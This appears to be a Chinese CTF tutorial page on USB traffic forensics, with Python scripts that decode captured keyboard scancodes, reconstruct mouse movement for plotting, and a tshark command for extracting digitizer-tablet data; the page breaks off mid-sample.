<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#翻译键盘数据1.py</span></span><br><span class="line">normalKeys=&#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>,<span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>,<span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>,<span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,<span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>,<span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>,<span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>,<span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>,<span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,<span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>,<span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>,<span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>,<span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>,<span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,<span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>,<span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>,<span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>,<span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>,<span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,<span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>,<span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>,<span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>,<span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>,<span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,<span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>,<span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,<span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>,<span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>,<span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>,<span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys=&#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>,<span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>,<span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>,<span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>,<span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,<span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>,<span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>,<span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>,<span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>,<span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,<span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>,<span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>,<span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>,<span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>,<span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,<span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>,<span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>,<span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>,<span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>,<span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,<span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>,<span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>,<span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>,<span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>,<span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,<span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>,<span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>,<span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>,<span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,<span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>,<span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>,<span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>,<span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (</span><br><span class="line">                line[<span class="number">1</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>] != <span class="string">&#x27;2&#x27;</span></span><br><span class="line">        ) <span class="keyword">or</span> line[<span class="number">3</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">                <span class="number">10</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">                    <span class="number">15</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">                        <span class="number">19</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">                            <span class="number">22</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],</span><br><span class="line">                       [shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>] == <span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i] == <span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">2</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">0</span>:</span><br><span class="line">            output[i] = output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#翻译键盘数据2.py</span></span><br><span class="line">mappings=&#123;<span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,<span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,<span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>,<span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>,<span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>,<span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>,<span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,<span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>,<span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,<span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>,<span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>,<span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>,<span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>,<span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,<span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>,<span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>,<span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>,<span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>,<span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>,<span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>,<span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>,<span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>,<span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>,<span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>,<span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>,<span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>,<span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>,<span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>,<span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,<span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>,<span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>,<span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>,<span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>,<span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>,<span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>,<span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,<span class="number">0X2B</span>:<span class="string">&quot;&quot;</span>,<span class="number">0x2C</span>:<span class="string">&quot;&quot;</span>,<span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>,<span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>,<span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,<span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,<span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>,<span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>,<span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,<span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,<span class="number">0x37</span>:<span class="string">&quot;.&quot;</span>&#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">            <span class="number">4</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">                <span class="number">12</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">                    <span class="number">16</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[</span><br><span class="line">                        <span class="number">21</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>] != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure>
<p>提取出来的数据如果有&lt;SPACE&gt;&lt;DEL&gt;&lt;RET&gt;,我们可以用vscode中的正则匹配来替换他们</p>
<h5 id="鼠标流量">鼠标流量</h5>
<p>例题6：键盘流量分析</p>
<p>前两步和键盘流量一样，提取数据并加冒号，但是这里要注意判断数据的长度</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#给数据添加冒号.py</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">8</span>:  <span class="comment"># 键盘流量的话len改为16</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i + <span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out += a[i] + a[i + <span class="number">1</span>] + <span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out += a[i] + a[i + <span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
<p>根据加完冒号的数据获取坐标</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取鼠标坐标.py</span></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">1</span> : <span class="comment"># 1 代表左键</span></span><br><span class="line">        f.write(<span class="built_in">str</span>(posx))</span><br><span class="line">        f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(posy))</span><br><span class="line">        f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>之后可以用gnuplot或者用python脚本画图</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gnuplot画图命令</span></span><br><span class="line">gnuplot&gt; plot <span class="string">&quot;xy.txt&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据坐标画图.py</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x, y = np.loadtxt(<span class="string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="string">&#x27; &#x27;</span>, unpack=<span class="literal">True</span>)</span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>如果图片是反的或者是镜像的，可以用PS处理一下</p>
<h5 id="数位板流量分析：">数位板流量分析：</h5>
<p>先导出数据</p>
<p>tshark -r hard_Digital_plate.pcapng -T fields -e usbhid.data | sed ‘/^\s*$/d’ &gt; out.txt</p>
<p>#提取并去除空行</p>
<p>类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">08803708951e000000000000</span><br><span class="line">08803708951e000000000000</span><br><span class="line">08803708951e000000000000</span><br><span class="line">08803708951e000000000000</span><br><span class="line">08803708951e000000000000</span><br><span class="line">08813708951e650000000000</span><br><span class="line">08813808951ec10000000000</span><br><span class="line">08813908951e2e0100000000</span><br><span class="line">08813a08951e940100000000</span><br><span class="line">08813b08951ee20100000000</span><br><span class="line">08813c08951e1c0200000000</span><br><span 